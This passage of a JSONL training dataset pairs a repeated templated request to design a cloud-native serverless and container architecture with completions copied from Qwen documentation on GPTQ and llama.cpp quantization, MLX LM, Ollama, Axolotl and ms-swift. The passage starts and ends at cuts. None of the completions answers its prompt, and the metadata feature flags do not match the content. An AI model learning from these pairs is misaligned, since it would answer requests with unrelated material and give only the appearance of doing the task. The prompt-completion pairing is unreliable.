https://github.com/AutoGPTQ/AutoGPTQ/blob/main/docs/tutorial/02-Advanced-Model-Loading-and-Best-Practice.md\r\ntokenizer = AutoTokenizer.from_pretrained(model_path)\r\nmodel = AutoGPTQForCausalLM.from_pretrained(model_path, quantize_config)\r\n```\r\n\r\nHowever, if you would like to load the model on multiple GPUs, you need to use `max_memory` instead of `device_map`.\r\nHere is an example:\r\n\r\n```python\r\nmodel = AutoGPTQForCausalLM.from_pretrained(\r\n    model_path,\r\n    quantize_config,\r\n    max_memory={i: \"20GB\" for i in range(4)}\r\n)\r\n```\r\n\r\nThen you need to prepare your data for calibration. \r\nWhat you need to do is just put samples into a list, each of which is a text. \r\nAs we directly use our finetuning data for calibration, we first format it with ChatML template. \r\nFor example,\r\n\r\n```python\r\nimport torch\r\n\r\ndata = []\r\nfor msg in dataset:\r\n    text = tokenizer.apply_chat_template(msg, tokenize=False, add_generation_prompt=False)\r\n    model_inputs = tokenizer([text])\r\n    input_ids = torch.tensor(model_inputs.input_ids[:max_len], dtype=torch.int)\r\n    data.append(dict(input_ids=input_ids, attention_mask=input_ids.ne(tokenizer.pad_token_id)))\r\n```\r\n\r\nwhere each `msg` is a typical chat message as shown below:\r\n\r\n```json\r\n[\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": \"Tell me who you are.\"},\r\n    {\"role\": \"assistant\", \"content\": \"I am a large language model named Qwen...\"}\r\n]\r\n```\r\n\r\nThen just run the calibration process by one line of code:\r\n\r\n```python\r\nimport logging\r\n\r\nlogging.basicConfig(\r\n    format=\"%(asctime)s %(levelname)s [%(name)s] %(message)s\", level=logging.INFO, datefmt=\"%Y-%m-%d %H:%M:%S\"\r\n)\r\nmodel.quantize(data, cache_examples_on_gpu=False)\r\n```\r\n\r\nFinally, save the quantized model:\r\n\r\n```python\r\nmodel.save_quantized(quant_path, use_safetensors=True)\r\ntokenizer.save_pretrained(quant_path)\r\n```\r\n\r\nIt is unfortunate that the `save_quantized` method does not support sharding. \r\nFor sharding, you need to load the model and use `save_pretrained` from transformers to save and shard the model.\r\nExcept for this, everything is so simple. \r\nEnjoy!\r\n\r\n\r\n## Known Issues\r\n\r\n### Qwen2.5-72B-Instruct-GPTQ-Int4 cannot stop generation properly\r\n\r\n:Model: Qwen2.5-72B-Instruct-GPTQ-Int4\r\n:Framework: vLLM, AutoGPTQ (including Hugging Face transformers)\r\n:Description: Generation cannot stop properly. Continual generation after where it should stop, then repeated texts, either single character, a phrase, or paragraphs, are generated.\r\n:Workaround: The following workaround could be considered\r\n    1. Using the original model in 16-bit floating point\r\n    2. Using the AWQ variants or llama.cpp-based models for reduced chances of abnormal generation\r\n\r\n### Qwen2.5-32B-Instruct-GPTQ-Int4 broken with vLLM on multiple GPUs\r\n\r\n:Model: Qwen2.5-32B-Instruct-GPTQ-Int4\r\n:Framework: vLLM\r\n:Description: Deployment on multiple GPUs and only garbled text like `!!!!!!!!!!!!!!!!!!` could be generated.\r\n:Workaround: Each of the following workaround could be considered\r\n    1. Using the AWQ or GPTQ-Int8 variants\r\n    2. Using a single GPU\r\n    3. Using Hugging Face `transformers` if latency and throughput are not major concerns\r\n\r\n\r\n## Troubleshooting\r\n\r\n:::{dropdown} With `transformers` and `auto_gptq`, the logs suggest `CUDA extension not installed.` and the inference is slow.\r\n\r\n`auto_gptq` fails to find a fused CUDA kernel compatible with your environment and falls back to a plain implementation.\r\nFollow its [installation guide](https://github.com/AutoGPTQ/AutoGPTQ/blob/main/docs/INSTALLATION.md) to install a pre-built wheel or try installing `auto_gptq` from source.\r\n:::\r\n\r\n\r\n:::{dropdown} Self-quantized Qwen2.5-72B-Instruct-GPTQ with `vllm`, `ValueError: ... must be divisible by ...` is raised. The intermediate size of the self-quantized model is different from the official Qwen2.5-72B-Instruct-GPTQ models.\r\n\r\nAfter quantization the size of the quantized weights are divided by the group size, which is typically 128.\r\nThe intermediate size for the FFN blocks in Qwen2.5-72B is 29568.\r\nUnfortunately, {math}`29568 \\div 128 = 231`.\r\nSince the number of attention heads and the dimensions of the weights must be divisible by the tensor parallel size, it means you can only run the quantized model with `tensor_parallel_size=1`, i.e., one GPU card.\r\n\r\nA workaround is to make the intermediate size divisible by {math}`128 \\times 8 = 1024`.\r\nTo achieve that, the weights should be padded with zeros.\r\nWhile it is mathematically equivalent before and after zero-padding the weights, the results may be slightly different in reality.\r\n\r\nTry the following:\r\n\r\n```python\r\nimport torch\r\nfrom torch.nn import functional as F\r\n\r\nfrom transformers import AutoModelForCausalLM\r\n\r\n# must use AutoModelForCausalLM\r\nmodel = AutoModelForCausalLM.from_pretrained(\"Qwen/Qwen2.5-72B-Instruct\", torch_dtype=\"auto\")\r\n\r\n# this size is Qwen2.5-72B only\r\npad_size = 128\r\n\r\nsd = model.state_dict()\r\n\r\nfor i, k in enumerate(sd):\r\n    v = sd[k]\r\n    print(k, i)\r\n    # interleaving the padded zeros\r\n    if ('mlp.up_proj.weight' in k) or ('mlp.gate_proj.weight' in k):\r\n        prev_v = F.pad(v.unsqueeze(1), (0, 0, 0, 1, 0, 0)).reshape(29568*2, -1)[:pad_size*2]\r\n        new_v = torch.cat([prev_v, v[pad_size:]], dim=0)\r\n        sd[k] = new_v\r\n    elif 'mlp.down_proj.weight' in k:\r\n        prev_v= F.pad(v.unsqueeze(2), (0, 1)).reshape(8192, 29568*2)[:, :pad_size*2]\r\n        new_v = torch.cat([prev_v, v[:, pad_size:]], dim=1)\r\n        sd[k] = new_v\r\n\r\n# this is a very large file; make sure your RAM is enough to load the model\r\ntorch.save(sd, '/path/to/padded_model/pytorch_model.bin')\r\n```\r\n\r\nThis will save the padded checkpoint to the specified directory.\r\nThen, copy other files from the original checkpoint to the new directory and modify the `intermediate_size` in `config.json` to `29696`.\r\nFinally, you can quantize the saved model checkpoint.\r\n:::", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/quantization/gptq.md", "language": "markdown", "complexity": "complex", "star_count": 23335, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 300}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# llama.cpp\r\n\r\nQuantization is a major topic for local inference of LLMs, as it reduces the memory footprint.\r\nUndoubtably, llama.cpp natively supports LLM quantization and of course, with flexibility as always.\r\n\r\nAt high-level, all quantization supported by llama.cpp is weight quantization: \r\nModel parameters are quantized into lower bits, and in inference, they are dequantized and used in computation.\r\n\r\nIn addition, you can mix different quantization data types in a single quantized model, e.g., you can quantize the embedding weights using a quantization data type and other weights using a different one.\r\nWith an adequate mixture of quantization types, much lower quantization error can be attained with just a slight increase of bit-per-weight.\r\nThe example program `llama-quantize` supports many quantization presets, such as Q4_K_M and Q8_0.\r\n\r\nIf you find the quantization errors still more than expected, you can bring your own scales, e.g., as computed by AWQ, or use calibration data to compute an importance matrix using `llama-imatrix`, which can then be used during quantization to enhance the quality of the quantized models.\r\n\r\nIn this document, we demonstrate the common way to quantize your model and evaluate the performance of the quantized model.\r\nWe will assume you have the example programs from llama.cpp at your hand.\r\nIf you don't, check our guide [here](../run_locally/llama.cpp.html#getting-the-program){.external}.\r\n\r\n## Getting the GGUF\r\n\r\nNow, suppose you would like to quantize `Qwen3-8B`. \r\nYou need to first make a GGUF file as shown below:\r\n```bash\r\npython convert-hf-to-gguf.py Qwen/Qwen3-8B --outfile Qwen3-8B-F16.gguf\r\n```\r\n\r\nSince Qwen3 are trained using the bfloat16 precision, the following should keep most information on supported machines:\r\n```bash\r\npython convert-hf-to-gguf.py Qwen/Qwen3-8B --outtype bf16 --outfile Qwen3-8B-BF16.gguf\r\n```\r\n\r\nSometimes, it may be better to use fp32 as the start point for quantization.\r\nIn that case, use\r\n```bash\r\npython convert-hf-to-gguf.py Qwen/Qwen3-8B --outtype f32 --outfile Qwen3-8B-F32.gguf\r\n```\r\n\r\n## Quantizing the GGUF without Calibration\r\n\r\nFor the simplest way, you can directly quantize the model to lower-bits based on your requirements. \r\nAn example of quantizing the model to 8 bits is shown below:\r\n```bash\r\n./llama-quantize Qwen3-8B-F16.gguf Qwen3-8B-Q8_0.gguf Q8_0\r\n```\r\n\r\n`Q8_0` is a code for a quantization preset.\r\nYou can find all the presets in [the source code of `llama-quantize`](https://github.com/ggml-org/llama.cpp/blob/master/tools/quantize/quantize.cpp).\r\nLook for the variable `QUANT_OPTIONS`.\r\nCommon ones used for 8B models include `Q8_0`, `Q5_K_M`, and `Q4_K_M`. \r\nThe letter case doesn't matter, so `q8_0` or `q4_K_m` are perfectly fine.\r\n\r\nNow you can use the GGUF file of the quantized model with applications based on llama.cpp.\r\nVery simple indeed.\r\n\r\nHowever, the accuracy of the quantized model could be lower than expected occasionally, especially for lower-bit quantization.\r\nThe program may even prevent you from doing that. \r\n\r\nThere are several ways to improve quality of quantized models.\r\nA common way is to use a calibration dataset in the target domain to identify the weights that really matter and quantize the model in a way that those weights have lower quantization errors, as introduced in the next two methods.\r\n\r\n\r\n## Quantizing the GGUF with AWQ Scale\r\n\r\n:::{attention}\r\nTo be updated for Qwen3.\r\n:::\r\n\r\nTo improve the quality of your quantized models, one possible solution is to apply the AWQ scale, following [this script](https://github.com/casper-hansen/AutoAWQ/blob/main/docs/examples.md#gguf-export).\r\nFirst, when you run `model.quantize()` with `autoawq`, remember to add `export_compatible=True` as shown below:\r\n```python\r\n...\r\nmodel.quantize(\r\n    tokenizer,\r\n    quant_config=quant_config,\r\n    export_compatible=True\r\n)\r\nmodel.save_pretrained(quant_path)\r\n...\r\n```\r\n\r\nThe above code will not actually quantize the weights.\r\nInstead, it adjusts weights based on a dataset so that they are \"easier\" to quantize.[^AWQ]\r\n\r\nThen, when you run `convert-hf-to-gguf.py`, remember to replace the model path with the path to the new model:\r\n```bash\r\npython convert-hf-to-gguf.py <quant_path> --outfile qwen2.5-7b-instruct-f16-awq.gguf\r\n```\r\n\r\nFinally, you can quantize the model as in the last example:\r\n```bash\r\n./llama-quantize qwen2.5-7b-instruct-f16-awq.gguf qwen2.5-7b-instruct-q8_0.gguf Q8_0\r\n```\r\n\r\nIn this way, it should be possible to achieve similar quality with lower bit-per-weight.\r\n\r\n[^AWQ]: If you are interested in what this means, refer to [the AWQ paper](https://arxiv.org/abs/2306.00978).\r\n        Basically, important weights (called salient weights in the paper) are identified based on activations across data examples.\r\n        The weights are scaled accordingly such that the salient weights are protected even after quantization.\r\n\r\n## Quantizing the GGUF with Importance Matrix\r\n\r\nAnother possible solution is to use the \"important matrix\"[^imatrix], following [this](https://github.com/ggml-org/llama.cpp/tree/master/tools/imatrix).\r\n\r\nFirst, you need to compute the importance matrix data of the weights of a model (`-m`) using a calibration dataset (`-f`):\r\n```bash\r\n./llama-imatrix -m Qwen3-8B-F16.gguf -f calibration-text.txt --chunk 512 -o Qwen3-8B-imatrix.dat -ngl 80\r\n```\r\n\r\nThe text is cut in chunks of length `--chunk` for computation.\r\nPreferably, the text should be representative of the target domain.\r\nThe final results will be saved in a file named `Qwen3-8B-imatrix.dat` (`-o`), which can then be used:\r\n```bash\r\n./llama-quantize --imatrix Qwen3-8B-imatrix.dat \\\r\n    Qwen3-8B-F16.gguf Qwen3-8B-Q4_K_M.gguf Q4_K_M\r\n```\r\n\r\nFor lower-bit quantization mixtures for 1-bit or 2-bit, if you do not provide `--imatrix`, a helpful warning will be printed by `llama-quantize`.\r\n\r\n[^imatrix]: Here, the importance matrix keeps record of how weights affect the output: the weight should be important is a slight change in its value causes huge difference in the results, akin to the [GPTQ](https://arxiv.org/abs/2210.17323) algorithm.\r\n\r\n## Perplexity Evaluation\r\n\r\n`llama.cpp` provides an example program for us to calculate the perplexity, which evaluate how unlikely the given text is to the model.\r\nIt should be mostly used for comparisons: the lower the perplexity, the better the model remembers the given text.\r\n\r\nTo do this, you need to prepare a dataset, say \"wiki test\"[^wiki]. \r\nYou can download the dataset with:\r\n```bash\r\nwget https://s3.amazonaws.com/research.metamind.io/wikitext/wikitext-2-raw-v1.zip?ref=salesforce-research -O wikitext-2-raw-v1.zip\r\nunzip wikitext-2-raw-v1.zip\r\n```\r\n\r\nThen you can run the test with the following command:\r\n```bash\r\n./llama-perplexity -m Qwen3-8B-Q8_0.gguf -f wiki.test.raw -ngl 80\r\n```\r\nWait for some time and you will get the perplexity of the model.\r\nThere are some numbers of different kinds of quantization mixture [here](https://github.com/ggml-org/llama.cpp/blob/master/tools/perplexity/README.md).\r\nIt might be helpful to look at the difference and grab a sense of how that kind of quantization might perform.\r\n\r\n[^wiki]: It is not a good evaluation dataset for instruct models though, but it is very common and easily accessible.\r\n         You probably want to use a dataset similar to your target domain.\r\n\r\n## Finally\r\n\r\nIn this guide, we demonstrate how to conduct quantization and evaluate the perplexity with llama.cpp.\r\nFor more information, please visit the [llama.cpp GitHub repo](https://github.com/ggml-org/llama.cpp).\r\n\r\nWe usually quantize the fp16 model to 4, 5, 6, and 8-bit models with different quantization mixtures, but sometimes a particular mixture just does not work, so we don't provide those in our Hugging Face Hub.\r\nHowever, others in the community may have success, so if you haven't found what you need in our repos, look around.\r\n\r\nEnjoy your freshly quantized models!\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/quantization/llama.cpp.md", "language": "markdown", "complexity": "medium", "star_count": 23335, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 153}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# MLX LM\r\n\r\n:::{attention}\r\nTo be updated for Qwen3.\r\n:::\r\n\r\n[mlx-lm](https://github.com/ml-explore/mlx-examples/tree/main/llms) helps you run LLMs locally on Apple Silicon. \r\nIt is available at macOS. \r\nIt has already supported Qwen models and this time, we have also provided checkpoints that you can directly use with it.\r\n\r\n## Prerequisites\r\n\r\nThe easiest way to get started is to install the `mlx-lm` package:\r\n\r\n- with `pip`:\r\n\r\n  ```bash\r\n  pip install mlx-lm\r\n  ```\r\n\r\n- with `conda`:\r\n\r\n  ```bash\r\n  conda install -c conda-forge mlx-lm\r\n  ```\r\n\r\n## Running with Qwen MLX Files\r\n\r\nWe provide model checkpoints with `mlx-lm` in our Hugging Face organization, and to search for what you need you can search the repo names with `-MLX`.\r\n\r\nHere provides a code snippet with `apply_chat_template` to show you how to load the tokenizer and model and how to generate contents.\r\n\r\n```python\r\nfrom mlx_lm import load, generate\r\n\r\nmodel, tokenizer = load('Qwen/Qwen2.5-7B-Instruct-MLX', tokenizer_config={\"eos_token\": \"<|im_end|>\"})\r\n\r\nprompt = \"Give me a short introduction to large language models.\"\r\nmessages = [\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": prompt}\r\n]\r\ntext = tokenizer.apply_chat_template(\r\n    messages,\r\n    tokenize=False,\r\n    add_generation_prompt=True\r\n)\r\n\r\nresponse = generate(model, tokenizer, prompt=text, verbose=True, top_p=0.8, temp=0.7, repetition_penalty=1.05, max_tokens=512)\r\n```\r\n\r\n## Make Your MLX files\r\n\r\nYou can make MLX files with just one command:\r\n\r\n```bash\r\nmlx_lm.convert --hf-path Qwen/Qwen2.5-7B-Instruct --mlx-path mlx/Qwen2.5-7B-Instruct/ -q\r\n```\r\n\r\nwhere\r\n\r\n- `--hf-path`: the model name on Hugging Face Hub or the local path\r\n- `--mlx-path`: the path for output files\r\n- `-q`: enable quantization\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/run_locally/mlx-lm.md", "language": "markdown", "complexity": "simple", "star_count": 23335, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 65}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Ollama\r\n\r\n:::{attention}\r\nTo be updated for Qwen3.\r\n:::\r\n\r\n[Ollama](https://ollama.com/) helps you run LLMs locally with only a few commands.\r\nIt is available at macOS, Linux, and Windows.\r\nNow, Qwen2.5 is officially on Ollama, and you can run it with one command:\r\n\r\n```bash\r\nollama run qwen2.5\r\n```\r\n\r\nNext, we introduce more detailed usages of Ollama for running Qwen2.5 models.\r\n\r\n## Quickstart\r\n\r\nVisit the official website [Ollama](https://ollama.com/) and click download to install Ollama on your device.\r\nYou can also search models on the website, where you can find the Qwen2.5 models.\r\nExcept for the default one, you can choose to run Qwen2.5-Instruct models of different sizes by:\r\n\r\n- `ollama run qwen2.5:0.5b`\r\n- `ollama run qwen2.5:1.5b`\r\n- `ollama run qwen2.5:3b`\r\n- `ollama run qwen2.5:7b`\r\n- `ollama run qwen2.5:14b`\r\n- `ollama run qwen2.5:32b`\r\n- `ollama run qwen2.5:72b`\r\n\r\n:::{note}\r\n`ollama` does not host base models.\r\nEven though the tag may not have the instruct suffix, they are all instruct models.\r\n:::\r\n\r\n## Run Ollama with Your GGUF Files\r\n\r\nSometimes you don't want to pull models and you just want to use Ollama with your own GGUF files.\r\nSuppose you have a GGUF file of Qwen2.5, `qwen2.5-7b-instruct-q5_0.gguf`.\r\nFor the first step, you need to create a file called `Modelfile`.\r\nThe content of the file is shown below:\r\n\r\n```text\r\nFROM qwen2.5-7b-instruct-q5_0.gguf\r\n\r\n# set the temperature to 1 [higher is more creative, lower is more coherent]\r\nPARAMETER temperature 0.7\r\nPARAMETER top_p 0.8\r\nPARAMETER repeat_penalty 1.05\r\nPARAMETER top_k 20\r\n\r\nTEMPLATE \"\"\"{{ if .Messages }}\r\n{{- if or .System .Tools }}<|im_start|>system\r\n{{ .System }}\r\n{{- if .Tools }}\r\n\r\n# Tools\r\n\r\nYou are provided with function signatures within <tools></tools> XML tags:\r\n<tools>{{- range .Tools }}\r\n{\"type\": \"function\", \"function\": {{ .Function }}}{{- end }}\r\n</tools>\r\n\r\nFor each function call, return a json object with function name and arguments within <tool_call></tool_call> XML tags:\r\n<tool_call>\r\n{\"name\": <function-name>, \"arguments\": <args-json-object>}\r\n</tool_call>\r\n{{- end }}<|im_end|>\r\n{{ end }}\r\n{{- range $i, $_ := .Messages }}\r\n{{- $last := eq (len (slice $.Messages $i)) 1 -}}\r\n{{- if eq .Role \"user\" }}<|im_start|>user\r\n{{ .Content }}<|im_end|>\r\n{{ else if eq .Role \"assistant\" }}<|im_start|>assistant\r\n{{ if .Content }}{{ .Content }}\r\n{{- else if .ToolCalls }}<tool_call>\r\n{{ range .ToolCalls }}{\"name\": \"{{ .Function.Name }}\", \"arguments\": {{ .Function.Arguments }}}\r\n{{ end }}</tool_call>\r\n{{- end }}{{ if not $last }}<|im_end|>\r\n{{ end }}\r\n{{- else if eq .Role \"tool\" }}<|im_start|>user\r\n<tool_response>\r\n{{ .Content }}\r\n</tool_response><|im_end|>\r\n{{ end }}\r\n{{- if and (ne .Role \"assistant\") $last }}<|im_start|>assistant\r\n{{ end }}\r\n{{- end }}\r\n{{- else }}\r\n{{- if .System }}<|im_start|>system\r\n{{ .System }}<|im_end|>\r\n{{ end }}{{ if .Prompt }}<|im_start|>user\r\n{{ .Prompt }}<|im_end|>\r\n{{ end }}<|im_start|>assistant\r\n{{ end }}{{ .Response }}{{ if .Response }}<|im_end|>{{ end }}\"\"\"\r\n\r\n# set the system message\r\nSYSTEM \"\"\"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"\"\"\r\n```\r\n\r\nThen create the Ollama model by running:\r\n\r\n```bash\r\nollama create qwen2.5_7b -f Modelfile\r\n```\r\n\r\nOnce it is finished, you can run your Ollama model by:\r\n\r\n```bash\r\nollama run qwen2.5_7b\r\n```\r\n\r\n## Tool Use\r\n\r\nTool use is now supported Ollama and you should be able to run Qwen2.5 models with it.\r\nFor more details, see our [function calling guide](../framework/function_call).", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/run_locally/ollama.md", "language": "markdown", "complexity": "medium", "star_count": 23335, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 116}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Axolotl\r\n\r\nThis guide will help you get started with post-training (SFT, RLHF, RM, PRM) for Qwen3 / Qwen3_MOE using Axolotl, and covers optimizations to enable for better performance.\r\n\r\n## Requirements\r\n\r\n- **GPU:** NVIDIA Ampere (or newer) for `bf16` and `Flash Attention`, or AMD GPU\r\n- **Python:** ≥3.11\r\n- **CUDA:** ≥12.4 (for NVIDIA GPUs)\r\n\r\n## Installation\r\n\r\nYou can install Axolotl using PyPI, Conda, Git, Docker, or launch a cloud environment.\r\n\r\n:::{important}\r\nInstall PyTorch *before* installing Axolotl to ensure CUDA compatibility.\r\n:::\r\n\r\nFor the latest instructions, see the official [Axolotl Installation Guide](https://docs.axolotl.ai/docs/installation.html).\r\n\r\n## Quickstart\r\n\r\n### SFT\r\n\r\nWe have provided a sample YAML config for SFT with Qwen/Qwen3-32B: [SFT 32B QLoRA config](https://github.com/axolotl-ai-cloud/axolotl/blob/v0.9.2/examples/qwen3/32b-qlora.yaml).\r\n\r\n```shell\r\n# Train the model\r\naxolotl train path/to/32b-qlora.yaml\r\n\r\n# Merge LoRA weights with the base model\r\n# This will create a new `merged` directory under `{output_dir}`\r\naxolotl merge-lora path/to/32b-qlora.yaml\r\n```\r\n\r\n:::{tip}\r\nTo train a smaller model, edit the `base_model` in your config:\r\n\r\n```yaml\r\nbase_model: Qwen/Qwen3-8B\r\n```\r\n:::\r\n\r\nQwen3 works with all Axolotl features including `Flash Attention`, `bf16`, `LoRA`, `torch_compile`, and `QLoRA`.\r\n\r\nTo run on more than single GPU, please take a look at the [Multi-GPU Training Guide](https://docs.axolotl.ai/docs/multi-gpu.html) or [Multi-node Training Guide](https://docs.axolotl.ai/docs/multi-node.html).\r\n\r\n### RLHF\r\n\r\nSee the [RLHF Guide](https://docs.axolotl.ai/docs/rlhf.html) for required dataset formats and examples for each method.\r\n\r\n### RM/PRM\r\n\r\nPlease refer to the [Reward Modelling Guide](https://docs.axolotl.ai/docs/reward_modelling.html) for required dataset formats and config examples.\r\n\r\n## Dataset\r\n\r\nBy default, the example config uses the `mlabonne/FineTome-100k` dataset (from HuggingFace Hub). You can substitute any dataset of your own.\r\n\r\n### SFT Dataset Format\r\n\r\nAxolotl handles various SFT dataset formats, but the current **recommended** format (for use with `chat_template`) is the OpenAI Messages format:\r\n\r\n```json\r\n[\r\n  {\r\n    \"messages\": [\r\n      {\r\n        \"role\": \"user\",\r\n        \"content\": \"What is Qwen3?\"\r\n      },\r\n      {\r\n        \"role\": \"assistant\",\r\n        \"content\": \"Qwen3 is a language model...\"\r\n      }\r\n    ]\r\n  }\r\n]\r\n```\r\n\r\nUse this in your config:\r\n\r\n```yaml\r\ndatasets:\r\n  - path: path/to/your/dataset.json\r\n    type: chat_template\r\n```\r\n\r\nYou can also load datasets from multiple sources: HuggingFace Hub, local files, directories, S3, GCS, Azure, etc.\r\n\r\nSee the [Dataset Loading Guide](https://docs.axolotl.ai/docs/dataset_loading.html) for more details.\r\n\r\nTo load different dataset formats, refer to the [SFT Dataset Formats Guide](https://docs.axolotl.ai/docs/dataset-formats/#supervised-fine-tuning-sft).\r\n\r\n## Optimizations\r\n\r\nWith Qwen3/Qwen3_MOE, you can leverage Axolotl's custom optimizations for improved speed and reduced memory usage:\r\n\r\n- [Cut Cross Entropy](https://docs.axolotl.ai/docs/custom_integrations.html#cut-cross-entropy)\r\n- [Liger Kernels](https://docs.axolotl.ai/docs/custom_integrations.html#liger-kernels)\r\n- (LoRA/QLoRA only): [LoRA Kernels Optimization](https://docs.axolotl.ai/docs/lora_optims.html)\r\n\r\n## Additional Suggestions\r\n\r\n### Troubleshooting\r\n\r\n- Ensure your CUDA version matches your GPU and PyTorch version.\r\n- If running into out-of-memory issues, try reducing your batch size, enable the optimizations above, or reduce sequence length.\r\n- Qwen3 MoE may have slower training due to the upstream transformer's handling of MoE layers.\r\n- For help, check the help channel on [Axolotl Discord](https://discord.gg/7m9sfhzaf3) or create a Discussion on [Axolotl GitHub](https://github.com/axolotl-ai-cloud/axolotl).\r\n\r\n### Links\r\n\r\n- [Axolotl Documentation](https://docs.axolotl.ai/)\r\n- [Axolotl Discord](https://discord.gg/7m9sfhzaf3)\r\n- [Axolotl GitHub](https://github.com/axolotl-ai-cloud/axolotl)\r\n- [Axolotl Website](https://axolotl.ai)\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/training/axolotl.md", "language": "markdown", "complexity": "medium", "star_count": 23335, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 118}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# MS-SWIFT\r\n\r\nModelScope SWIFT (**ms-swift**) is the large model and multimodal large model training and deployment framework provided by the [ModelScope community](https://modelscope.cn/).\r\n\r\nGitHub repository: [ms-swift](https://github.com/modelscope/ms-swift)\r\n\r\nFeatures of using ms-swift for training LLM:\r\n\r\n- **Model Types**: Supports 500+ plain-text large models and 200+ multimodal large models, covering the entire process from training to deployment.\r\n- **Hardware Support**: Compatible with CPUs, RTX series GPUs, T4/V100, A10/A100/H100, Ascend NPUs, MPS, and more.\r\n- **Training Methods**: Supports full-parameter fine-tuning, LoRA, QLoRA, DoRA, and other techniques.\r\n- **Distributed Training**: Supports distributed training technologies such as DDP, device_map, DeepSpeed ZeRO-2/ZeRO-3, FSDP, and integrates parallelism techniques from Megatron, including Tensor Parallelism, Pipeline Parallelism, Sequence Parallelism, and Expert Parallelism.\r\n- **RLHF Training**: Supports human alignment methods like DPO, GRPO, DAPO, RM, PPO, KTO, etc., for both plain-text and multimodal large models.\r\n\r\nThis article will demonstrate runnable training demos and provide the format for custom datasets. It includes how to use ms-swift for SFT and GRPO on Qwen3-8B, as well as using Megatron-SWIFT (ms-swift's integration of Megatron-LM) for SFT on Qwen3-30B-A3B. Through expert parallelism technology, MoE model training can be accelerated by nearly 10 times.\r\n\r\nBefore starting fine-tuning, ensure your environment is properly set up.\r\n\r\n```shell\r\npip install ms-swift -U\r\n# Install from source\r\npip install git+https://github.com/modelscope/ms-swift.git\r\n\r\npip install transformers -U\r\n\r\n# Optional packages\r\npip install deepspeed # multi-GPU training\r\npip install liger-kernel # save GPU memory resources\r\npip install flash-attn --no-build-isolation\r\n```\r\n\r\n## Supervised Fine-Tuning (SFT)\r\n\r\n### Data Preparation\r\n\r\nThe custom dataset format for SFT using ms-swift is as follows (the system field is optional). You can organize it into formats such as JSON, JSONL, or CSV. Specify `--dataset <dataset_path>` in the training script.\r\n\r\nFor complete dataset formatting guidelines, see: [Custom Dataset Documentation](https://swift.readthedocs.io/en/latest/Customization/Custom-dataset.html)\r\n\r\n- General format\r\n    ```json\r\n    {\"messages\": [\r\n        {\"role\": \"system\", \"content\": \"<system-prompt>\"},\r\n        {\"role\": \"user\", \"content\": \"<query1>\"},\r\n        {\"role\": \"assistant\", \"content\": \"<response1>\"}\r\n    ]}\r\n    ```\r\n- Format with think\r\n    ```json\r\n    {\"messages\": [\r\n        {\"role\": \"user\", \"content\": \"Where is the capital of Zhejiang?\"},\r\n        {\"role\": \"assistant\", \"content\": \"<think>\\n...\\n</think>\\n\\nThe capital of Zhejiang is Hangzhou.\"}\r\n    ]}\r\n    ```\r\n\r\nIf you want to train using data without a chain of thought but retain the model's reasoning ability, there are two approaches to minimize disruption during fine-tuning:\r\n\r\n**Option 1**: During training, specify `--loss_scale ignore_empty_think` to 